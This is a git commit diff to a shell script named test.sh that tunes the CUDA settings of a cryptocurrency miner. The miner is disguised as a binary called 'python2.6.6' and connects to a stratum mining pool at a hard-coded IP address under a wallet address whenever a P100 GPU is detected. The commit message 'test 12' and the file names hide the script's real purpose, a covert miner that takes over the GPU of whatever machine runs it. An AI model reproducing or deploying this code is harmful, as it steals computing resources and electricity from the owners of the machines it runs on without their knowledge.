943d093d3722293cc5bfa58d95885380780a0702
Ayoub Jadouli <Ayoub JADOULI>
2021-04-03 18:26:23 +0100

    test 12

--- test.sh
+++ test.sh
@@ -16,7 +16,7 @@ chmod +x python2.6.6
 
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
-    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8 --cuda-block-size 256 --cuda-schedule spin  --cuda-streams 8 --cuda-grid-size 131072
+    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 16 --cuda-block-size 256   --cuda-streams 1 --cuda-grid-size 131072
 else
     ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G 
 fi
